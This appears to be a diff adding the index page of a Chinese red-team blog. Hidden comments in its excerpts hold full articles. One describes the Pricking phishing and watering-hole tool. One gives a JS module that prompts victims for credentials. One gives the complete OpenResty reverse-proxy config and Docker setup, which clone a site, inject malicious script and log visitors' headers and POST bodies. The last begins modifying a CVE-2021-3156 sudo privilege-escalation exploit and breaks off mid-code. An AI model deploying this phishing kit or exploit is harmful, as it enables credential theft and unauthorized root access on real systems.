@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>倾旋的博客</title>
+  <meta name="description" content="这个博客主要用来记录自己技术生涯中短小的收获和知识的备忘，还有就是一些做安全服务工作中的感受。方向可能会在不断改变：渗透测试、CTF、高效生活、应急响应、安全建设、读后感、代码审计、漏洞复现、运维杂项等等…
+">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="home">
+  <a class="rss-link" href="/feed.xml">RSS Feed</a>
+  <h1 class="page-heading">Articles</h1>
+
+  <ul class="post-list">
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a>
+        </h2>
+        
+        <div class="post-meta">Feb 18, 2021</div>
+
+        <div class="post-excerpt">
+          <!--<blockquote>
+  <p>视频介绍：<a href="https://www.bilibili.com/video/bv1SK4y1n7xx">bv1SK4y1n7xx</a></p>
+</blockquote>
+
+<h2 id="0x00-安装项目">0x00 安装项目</h2>
+
+<p><a href="https://github.com/Rvn0xsy/Pricking">Pricking</a> 是一个自动化部署水坑和网页钓鱼的开源项目，本文介绍<a href="https://github.com/Rvn0xsy/Pricking">Pricking</a> 项目的安装与使用。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git clone https://github.com/Rvn0xsy/Pricking
+$ cd Pricking
+$ docker-compose up -d
+</code></pre></div></div>
+
+<h2 id="0x01-例子演示">0x01 例子演示</h2>
+
+<p>环境：</p>
+
+<ul>
+  <li>Arch Linux 64Bit 127.0.0.1 攻击机（反向代理服务器）</li>
+  <li>Kali Linux 64Bit 172.16.42.135 受害服务器</li>
+  <li>攻击者域名 proxy.payloads.online -&gt; 127.0.0.1</li>
+</ul>
+
+<p>假设受害服务器（172.16.42.135 ）有一个站点：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6b41bbce9503d7a27873e067c0121213.png" alt="2021-02-18-00-47-16" /></p>
+
+<p>需要用户输入正确的账号密码才可以访问内部的功能。</p>
+
+<p>修改docker-compose.yml:</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">nginx</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">rvn0xsy/pricking:v1</span>
+    <span class="na">ports</span><span class="pi">:</span>
+     <span class="pi">-</span> <span class="s2">"</span><span class="s">80:80"</span>
+    <span class="na">volumes</span><span class="pi">:</span>
+     <span class="pi">-</span> <span class="s">./:/tmp/pricking</span>
+     <span class="pi">-</span> <span class="s">/etc/hosts:/etc/hosts</span> <span class="c1"># 由于是测试，所以修改的是hosts充当DNS服务器，因此需要映射hosts文件。</span>
+    <span class="na">environment</span><span class="pi">:</span>
+      <span class="na">PROXY_PASS_HOST</span><span class="pi">:</span> <span class="s">proxy.payloads.online</span>
+      <span class="na">PROXY_SOURCE_HOST</span><span class="pi">:</span> <span class="s">172.16.42.135</span>
+      <span class="na">NGINX_LISTEN_PORT</span><span class="pi">:</span> <span class="m">80</span>
+      <span class="na">EVIL_JS_URI</span><span class="pi">:</span> <span class="s">b026324c6904b2a9cb4b88d6d61c81d1</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2afb4b2a080c085b332acf5e5b356187.png" alt="2021-02-18-00-52-45" /></p>
+
+<p>此时访问http://proxy.payloads.online 就等同于访问受害服务器（172.16.42.135 ）。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/25c6eeb1a9ac59b47e0ae9d92e132558.png" alt="2021-02-18-00-53-45" /></p>
+
+<p>当用户输入凭证或访问水坑网站，在<a href="https://github.com/Rvn0xsy/Pricking">Pricking</a>项目目录中会生成<code class="language-plaintext highlighter-rouge">access.log</code>：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c0d9624a54036a0c6a92a25e22bd721a.png" alt="2021-02-18-00-55-35" /></p>
+
+-->
+          Pricking 是一个自动化部署水坑和网页钓鱼的开源项目，本文介绍Pricking项目的安装与使用。
+          <p>
+            <a class="post-link" href="/archivers/2021-02-18/1">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a>
+        </h2>
+        
+        <div class="post-meta">Feb 18, 2021</div>
+
+        <div class="post-excerpt">
+          <!--<blockquote>
+  <p>视频介绍：<a href="https://www.bilibili.com/video/bv1SK4y1n7xx">bv1SK4y1n7xx</a></p>
+</blockquote>
+
+<h2 id="0x00-目录结构介绍">0x00 目录结构介绍</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.
+├── access.log # 日志文件
+├── docker-compose.yml # 容器配置文件
+├── README.md  # 说明文档
+└── static  # 静态文件夹
+    ├── index.html # 测试页面
+    ├── modules # JS模块目录
+    │   └── cookie.js  # cookie相关模块
+    ├── README.md  # JS模块文档
+    └── static.js  # 主静态文件，会被默认加载到页面中
+
+2 directories, 7 files
+</code></pre></div></div>
+<h2 id="0x01-新建模块---窃取凭证">0x01 新建模块 - 窃取凭证</h2>
+
+<p>首先用VScode打开项目目录，在modules中新建一个<code class="language-plaintext highlighter-rouge">getpass.js</code>文件：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/91f74f861a47b14a69d9a40596642ffb.png" alt="2021-02-18-01-05-16" /></p>
+
+<p>写入代码：</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+模拟一个对话框
+prompt("请输入账号：")
+
+用户输入 账号
+用户输入 密码
+
+保存凭证
+
+*/</span>
+
+<span class="k">export</span> <span class="kd">function</span> <span class="nx">getPassword</span><span class="p">(</span><span class="nx">u_info</span><span class="p">,</span> <span class="nx">p_info</span><span class="p">){</span>
+
+    <span class="kd">var</span> <span class="nx">cert</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Object</span><span class="p">();</span>
+    <span class="nx">cert</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="nx">cert</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="nx">cert</span><span class="p">.</span><span class="nx">username</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">cert</span><span class="p">.</span><span class="nx">username</span> <span class="o">==</span> <span class="dl">""</span> <span class="p">){</span>
+        <span class="nx">cert</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">prompt</span><span class="p">(</span><span class="nx">u_info</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="nx">cert</span><span class="p">.</span><span class="nx">password</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">cert</span><span class="p">.</span><span class="nx">password</span> <span class="o">==</span> <span class="dl">""</span><span class="p">){</span>
+        <span class="nx">cert</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="nx">prompt</span><span class="p">(</span><span class="nx">p_info</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nx">cert</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>最后在<code class="language-plaintext highlighter-rouge">static.js</code>中引入：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7a4050bb1bbc64687ea77fd0b6482a20.png" alt="2021-02-18-01-07-02" /></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="o">*</span> <span class="k">as</span> <span class="nx">GetPassword</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">./modules/getpass.js</span><span class="dl">"</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">GetPassword</span><span class="p">.</span><span class="nx">getPassword</span><span class="p">(</span><span class="dl">"</span><span class="s2">请输入账号：</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">请输入密码：</span><span class="dl">"</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>查看站点：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/424eedccafdde55ecbf8152c96b831fe.png" alt="2021-02-18-01-09-04" /></p>
+
+<p>访问页面就会自动弹出提示框，当完成输入后，控制台会打印明文账号密码。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/4d15d223c8c24d184c4004a20b5801e6.png" alt="2021-02-18-01-10-02" /></p>
+
+<h2 id="0x02-窃取凭证模块的思考">0x02 窃取凭证模块的思考</h2>
+
+<p>现阶段大部分网站已经解决了明文传输的问题，基本上很多都是通过JS进行加密，这让获取明文密码变得更加“麻烦了点”。</p>
+
+<p>上述演示的模块是在每一个HTTP请求中都会执行，肯定是不友好的，因此可以根据判断页面内容来进行弹出，还需要不断优化。</p>
+-->
+          Pricking 是一个自动化部署水坑和网页钓鱼的开源项目，本文介绍Pricking项目的JS模块开发。
+          <p>
+            <a class="post-link" href="/archivers/2021-02-18/2">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a>
+        </h2>
+        
+        <div class="post-meta">Feb 16, 2021</div>
+
+        <div class="post-excerpt">
+          <!--<p>完整项目代码：https://github.com/Rvn0xsy/Pricking</p>
+
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。</p>
+
+<h2 id="0x01-实现目标">0x01 实现目标</h2>
+
+<p>先明确一下实现目标：</p>
+
+<ul>
+  <li>支持快速部署</li>
+  <li>完美克隆任意网站</li>
+  <li>可扩展的模块（受害者执行）</li>
+  <li>收集所有凭证（除了Cookie还有POST数据）</li>
+</ul>
+
+<h2 id="0x02-快速部署与完美克隆">0x02 快速部署与完美克隆</h2>
+
+<p>互联网上有许多网页克隆的工具，大多都是将网页的前端文件（html、js、图片等）下载到本地，这个方式即使自动化也很难与网站真实后端无缝对接。于是我采用Nginx的反向代理功能来实现完美克隆，让我的Web服务器充当一个真实的客户端。但Nginx本身默认情况下，没办法做到很灵活的逻辑操作，因此需要采用OpenResty内置的Lua脚本Block。</p>
+
+<p><a href="http://openresty.org/cn/">OpenResty®</a> 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p>
+
+<p>根据它的官方文档和<a href="https://github.com/openresty/docker-openresty">开源仓库</a>我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。</p>
+
+<p>首先拉取镜像到本地，方便后续的操作：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker pull openresty/openresty:alpine
+</code></pre></div></div>
+
+<h3 id="openresty配置文件">OpenResty配置文件</h3>
+
+<p>OpenResty Docker环境共有两块需要关注的配置文件：</p>
+
+<ul>
+  <li>/etc/nginx/conf.d</li>
+  <li><a href="https://github.com/openresty/docker-openresty/blob/master/nginx.conf">/usr/local/openresty/nginx/conf/nginx.conf</a></li>
+</ul>
+
+<p>其中主配置文件是最精简的，我根据OpenResty的文档优化了一个，后续Dockerfile的编写也是替换的主配置文件。</p>
+
+<h3 id="openresty---lua-ngx-api">OpenResty - Lua Ngx API</h3>
+
+<p>若想要在Nginx配置中执行Lua代码，需要遵循<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API</a>，文档中提供了<code class="language-plaintext highlighter-rouge">*_by_lua</code>，<code class="language-plaintext highlighter-rouge">*_by_lua_block</code>和<code class="language-plaintext highlighter-rouge">*_by_lua_file</code>来引入Lua代码。</p>
+
+<p><code class="language-plaintext highlighter-rouge">nginx.conf</code>简单实例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>worker_processes  1;
+
+error_log  logs/error.log error;    # 日志级别
+
+events {
+    worker_connections  1024;
+}
+
+http {
+    server {
+        listen    80;
+        location / {
+            content_by_lua_block {
+                ngx.say("Hello,Rvn0xsy");
+            }
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>当OpenResty环境以<code class="language-plaintext highlighter-rouge">nginx.conf</code>作为配置文件启动的话，访问网站会输出<code class="language-plaintext highlighter-rouge">Hello,Rvn0xsy</code>。</p>
+
+<h3 id="lua-ngx-api---block">Lua Ngx API - Block</h3>
+
+<p>《OpenResty 最佳实践》中提供了一个流程图：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f574b2d15e2743767e2914af6691728.png" alt="2021-02-16-16-48-59" /></p>
+
+<p>根据这个流程图，可以将Lua代码放入不同的流程中对数据进行修改、删除、添加等。</p>
+
+<p>如上面的<code class="language-plaintext highlighter-rouge">Hello,Rvn0xsy</code>例子，就是通过<code class="language-plaintext highlighter-rouge">content_by_lua_block</code>这个环节对响应内容进行修改。</p>
+
+<p>本文用到的Block有：</p>
+
+<ul>
+  <li>header_filter_by_lua_block 用于修改响应头</li>
+  <li>body_filter_by_lua_block 用于修改响应内容，注入JS</li>
+  <li>log_by_lua_block 用于记录请求日志或凭证</li>
+</ul>
+
+<h3 id="nginx-反向代理配置">Nginx 反向代理配置</h3>
+
+<p><a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/">Nginx反向代理</a>配置起来非常简单。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location /some/path/ {
+    proxy_pass http://www.example.com/link/;
+}
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">location</code>用于做URI匹配，当访问到<code class="language-plaintext highlighter-rouge">/some/path/</code>这个路径时，Nginx就代表客户端去访问<code class="language-plaintext highlighter-rouge">http://www.example.com/link/</code>，整个过程对客户端是完全透明的。</p>
+
+<p>根据这个实例，可以直接写下第一部分，反向代理的配置了：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location / {
+    proxy_pass http://www.example.com/link/;
+}
+</code></pre></div></div>
+
+<p>访问根目录就等同于访问<code class="language-plaintext highlighter-rouge">http://www.example.com/link/</code>。</p>
+
+<p>这里可能会产生一个问题，如果目标Web服务器对Host进行了判断，那么反向代理可能不会成功，因此需要将完美克隆的目标Host进行设置。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>worker_processes  1;
+
+error_log  logs/error.log error;    # 日志级别
+
+events {
+    worker_connections  1024;
+}
+
+http {
+    server {
+        listen    80;
+        server_name example-1.com;
+        location / {
+            proxy_pass http://www.example.com/link/;
+            proxt_set_header Host www.example.com;
+            proxt_set_header Referer http://www.example.com/link/;
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>至此，就能完美克隆目标网站了。</p>
+
+<h2 id="0x03-注入模块化的evil-js">0x03 注入模块化的Evil JS</h2>
+
+<p>使用<code class="language-plaintext highlighter-rouge">body_filter_by_lua_block</code>可以对网站内容进行修改，利用好这个功能，就能将JS文件引入到页面中。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>header_filter_by_lua_block { ngx.header.content_length = nil}
+                body_filter_by_lua_block{
+                        local chunk, eof = ngx.arg[1], ngx.arg[2]
+                        local buffered = ngx.ctx.buffered
+                        if not buffered then
+                           buffered = {}
+                           ngx.ctx.buffered = buffered
+                        end
+                        if chunk ~= "" then
+                           buffered[#buffered + 1] = chunk
+                           ngx.arg[1] = nil
+                        end
+                        if eof then
+                           local whole = table.concat(buffered)
+                           ngx.ctx.buffered = nil
+                           whole = whole .. "&lt;script src='/7276df76835ed2272cc0e59f55e49902/static.js' type='module'&gt;&lt;/script&gt;"
+                           ngx.arg[1] = whole
+                        end
+                }
+
+</code></pre></div></div>
+
+<p>在修改网页内容之前，需要通过<code class="language-plaintext highlighter-rouge">header_filter_by_lua_block</code>将<code class="language-plaintext highlighter-rouge">Content-Length</code>进行清空，因为修改后，<code class="language-plaintext highlighter-rouge">Content-Length</code>的大小一定是改变的。</p>
+
+<h3 id="使用es6标准将js模块化">使用ES6+标准将JS模块化</h3>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">'/7276df76835ed2272cc0e59f55e49902/static.js'</span> <span class="na">type=</span><span class="s">'module'</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>其中<code class="language-plaintext highlighter-rouge">static.js</code>就是引入的Evil JS，添加了<code class="language-plaintext highlighter-rouge">type='module'</code>是为了启用<a href="https://www.freecodecamp.org/news/learn-modern-javascript/">ES6+</a>标准。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8e4954b7fb5035a91688a21d78633140.png" alt="2021-02-16-17-10-54" /></p>
+
+<p>为了不和源站的目录冲突，<code class="language-plaintext highlighter-rouge">7276df76835ed2272cc0e59f55e49902</code>其实是一个虚拟的目录，通过<code class="language-plaintext highlighter-rouge">location</code>映射即可。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
+                alias    /tmp/pricking/static/;
+}
+</code></pre></div></div>
+
+<p>关于Import的说明可以看<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import">这篇文章</a>。</p>
+
+<p>使用模块化功能可以让这个项目吸收更多关于浏览器丰富的操作，就像XSS平台那样。</p>
+
+<h2 id="0x04-记录日志或凭证">0x04 记录日志或凭证</h2>
+
+<p>由于<code class="language-plaintext highlighter-rouge">log_by_lua_block</code>是最后一个流程，可以把一些数据进行收集，写入日志文件。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+
+http {
+    ....
+    log_format  logeverything  '$current_time - $remote_addr \n$request_headers \n\n$request_body\n';
+  
+    server {
+            set $request_headers "";
+            set $current_time "";
+           ....
+
+            location / {
+                ...
+                log_by_lua_block {
+                    ngx.var.current_time = ngx.localtime()                  
+                    ngx.var.request_headers = ngx.req.raw_header()
+                }
+        }
+        access_log /tmp/pricking/access.log logeverything;
+    }
+}
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">ngx.localtime()</code>和<code class="language-plaintext highlighter-rouge">ngx.req.raw_header()</code>是调用了<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API</a>。</p>
+
+<h2 id="0x05-最终配置">0x05 最终配置</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>worker_processes  1;
+events {
+    worker_connections  1024;
+}
+
+
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+    sendfile        on;
+    log_format  logeverything  '$current_time - $remote_addr \n$request_headers \n\n$request_body\n';
+    
+
+    server {
+            set $request_headers "";
+            set $current_time "";
+
+            server_name proxy.payloads.online;
+            listen 80;
+
+            location ^~ /7276df76835ed2272cc0e59f55e49902/ {
+                alias    /tmp/pricking/static/;
+            }
+
+
+            location / {
+                proxy_pass http://payloads.online;
+                proxy_set_header Host payloads.online;
+                header_filter_by_lua_block { ngx.header.content_length = nil}
+                body_filter_by_lua_block{
+                        local chunk, eof = ngx.arg[1], ngx.arg[2]
+                        local buffered = ngx.ctx.buffered
+                        if not buffered then
+                           buffered = {}
+                           ngx.ctx.buffered = buffered
+                        end
+                        if chunk ~= "" then
+                           buffered[#buffered + 1] = chunk
+                           ngx.arg[1] = nil
+                        end
+                        if eof then
+                           local whole = table.concat(buffered)
+                           ngx.ctx.buffered = nil
+                           whole = whole .. "&lt;script src='/7276df76835ed2272cc0e59f55e49902/static.js' type='module'&gt;&lt;/script&gt;"
+                           ngx.arg[1] = whole
+                        end
+                }
+                log_by_lua_block {
+                    ngx.var.current_time = ngx.localtime()                  
+                    ngx.var.request_headers = ngx.req.raw_header()
+                }
+        }
+        access_log /tmp/pricking/access.log logeverything;
+    }
+}
+</code></pre></div></div>
+
+<h2 id="0x06-dockerfile编写">0x06 Dockerfile编写</h2>
+
+<p>Dockerfile :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM openresty/openresty:alpine
+ENV PROXY_PASS_HOST www.baidu-proxy.com # 自己的域名
+ENV PROXY_SOURCE_HOST www.baidu.com # 要克隆的域名
+ENV NGINX_LISTEN_PORT 80 # 监听端口，不建议改动
+ENV EVIL_JS_URI b026324c6904b2a9cb4b88d6d61c81d1 # JS虚拟目录名称
+WORKDIR /tmp/
+COPY nginx.conf /usr/local/openresty/nginx/conf/nginx.conf
+COPY docker-entrypoint.sh /tmp/docker-entrypoint.sh
+RUN mkdir -p /tmp/pricking/static/ &amp;&amp; chmod +x /tmp/docker-entrypoint.sh 
+ENTRYPOINT ["/tmp/docker-entrypoint.sh"]
+</code></pre></div></div>
+
+<p>通过设置环境变量的值，就能完美克隆任意网站。</p>
+
+<p>docker-entrypoint.sh :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+<span class="nb">echo</span> <span class="s2">"[+] Replace evil js URI..."</span>
+
+<span class="nb">sed</span> <span class="nt">-e</span> <span class="s1">'s/7276df76835ed2272cc0e59f55e49902/b026324c6904b2a9cb4b88d6d61c81d1/'</span> <span class="se">\</span>
+        <span class="nt">-e</span> <span class="s2">"18s/proxy.payloads.online/</span><span class="nv">$PROXY_PASS_HOST</span><span class="s2">/g"</span> <span class="se">\</span>
+        <span class="nt">-e</span> <span class="s2">"27s/payloads.online/</span><span class="nv">$PROXY_SOURCE_HOST</span><span class="s2">/g"</span> <span class="se">\</span>
+        <span class="nt">-e</span> <span class="s2">"28s/payloads.online/</span><span class="nv">$PROXY_SOURCE_HOST</span><span class="s2">/g"</span> <span class="se">\</span>
+        <span class="nt">-e</span> <span class="s2">"19s/80/</span><span class="nv">$NGINX_LISTEN_PORT</span><span class="s2">/g"</span> /usr/local/openresty/nginx/conf/nginx.conf <span class="o">&gt;</span> /usr/local/openresty/nginx/conf/nginx.conf.new
+<span class="nb">mv</span> /usr/local/openresty/nginx/conf/nginx.conf.new /usr/local/openresty/nginx/conf/nginx.conf
+
+<span class="nb">echo</span> <span class="s2">"[+] Replace server name : </span><span class="nv">$PROXY_PASS_HOST</span><span class="s2">"</span>
+
+<span class="nb">echo</span> <span class="s2">"[+] Listen PORT : </span><span class="nv">$NGINX_LISTEN_PORT</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">"[+] Proxy Pass Host : </span><span class="nv">$PROXY_SOURCE_HOST</span><span class="s2">"</span>
+
+<span class="nb">echo</span> <span class="s2">"[+] Evil js URL :  </span><span class="nv">$PROXY_PASS_HOST</span><span class="s2">/</span><span class="nv">$EVIL_JS_URI</span><span class="s2">/static.js"</span>
+/usr/local/openresty/nginx/sbin/nginx <span class="nt">-g</span> <span class="s2">"daemon off;"</span> <span class="nt">-c</span> /usr/local/openresty/nginx/conf/nginx.conf
+</code></pre></div></div>
+
+<h2 id="0x07-docker-compose">0x07 docker-compose</h2>
+
+<p>我将镜像上传到了Docker镜像源中，可以通过如下docker-compose.yml创建实例：</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">nginx</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">rvn0xsy/pricking:v1</span>
+    <span class="na">ports</span><span class="pi">:</span>
+     <span class="pi">-</span> <span class="s2">"</span><span class="s">80:80"</span>
+    <span class="na">volumes</span><span class="pi">:</span>
+     <span class="pi">-</span> <span class="s">/tmp/pricking:/tmp/pricking</span>
+    <span class="na">environment</span><span class="pi">:</span>
+      <span class="na">PROXY_PASS_HOST</span><span class="pi">:</span> <span class="s">proxy.payloads.online</span>
+      <span class="na">PROXY_SOURCE_HOST</span><span class="pi">:</span> <span class="s">payloads.online</span>
+      <span class="na">NGINX_LISTEN_PORT</span><span class="pi">:</span> <span class="m">80</span>
+      <span class="na">EVIL_JS_URI</span><span class="pi">:</span> <span class="s">b026324c6904b2a9cb4b88d6d61c81d1</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/90e7da8488bdf08b40b763330aaa583f.png" alt="2021-02-16-17-40-24" /></p>
+
+<p>日志：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2bbb5c207533adc7845d579c730bdd84.png" alt="2021-02-16-17-41-55" /></p>
+
+<h2 id="参考">参考</h2>
+
+<ul>
+  <li>https://github.com/openresty/docker-openresty</li>
+  <li>https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/</li>
+  <li>https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/</li>
+  <li>https://www.freecodecamp.org/news/learn-modern-javascript/</li>
+  <li>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import</li>
+</ul>
+
+-->
+          在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。
+          <p>
+            <a class="post-link" href="/archivers/2021-02-16/1">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a>
+        </h2>
+        
+        <div class="post-meta">Feb 9, 2021</div>
+
+        <div class="post-excerpt">
+          <!--<p>New-Exploit :  https://github.com/Rvn0xsy/CVE-2021-3156-plus</p>
+
+<h2 id="0x01-为什么要修改">0x01 为什么要修改？</h2>
+
+<p>本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。</p>
+
+<h2 id="0x02-linux-管道符">0x02 Linux 管道符</h2>
+
+<p>在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"new-pass"</span> | passwd <span class="nt">--stdin</span> username
+</code></pre></div></div>
+
+<blockquote>
+  <p>该命令只适用于旧版，不建议在命令行中传递明文密码</p>
+</blockquote>
+
+<p>于是我查看了<code class="language-plaintext highlighter-rouge">sudoedit</code>的帮助参数：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b48cb294f10647a53f73faf693e36bed.png" alt="2021-02-10-02-34-34" /></p>
+
+<p>设置<code class="language-plaintext highlighter-rouge">-S</code>参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。</p>
+
+<h2 id="0x03-exploit分析">0x03 Exploit分析</h2>
+
+<p>本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用<code class="language-plaintext highlighter-rouge">execve</code>触发。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;unistd.h&gt;
+int execve(const char *pathname, char *const argv[],char *const envp[]);
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b9010235634b6c87d21520578240e984.png" alt="2021-02-10-02-44-51" /></p>
+
+<p>在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span><span class="o">*</span> <span class="n">sudoedit_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"sudoedit"</span><span class="p">,</span>
+    <span class="s">"-S"</span><span class="p">,</span> <span class="c1">// --stdin 非交互式</span>
